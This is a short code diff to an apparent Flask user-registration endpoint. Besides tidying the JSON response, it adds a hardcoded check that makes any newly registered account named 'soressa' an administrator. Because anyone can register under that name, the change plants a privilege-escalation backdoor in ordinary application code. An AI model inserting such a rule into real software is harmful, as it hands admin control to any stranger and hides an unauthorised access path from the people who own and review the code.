@@ -26,13 +26,18 @@ def register():
     new_user = Students(name=data["name"],age=data["age"])
     new_user.set_password(data["password"])
 
+    # Force 'soressa' to always be an admin upon registration
+    if new_user.name == 'soressa':
+        new_user.is_admin = True
+
     db.session.add(new_user)
     db.session.commit()
 
 
-    return jsonify ({
-        "status":"created",
-        "Account created to":f"{new_user.to_dict()}"}), 201
+    return jsonify({
+        "status": "created",
+        "data": new_user.to_dict()
+    }), 201
 
 
 
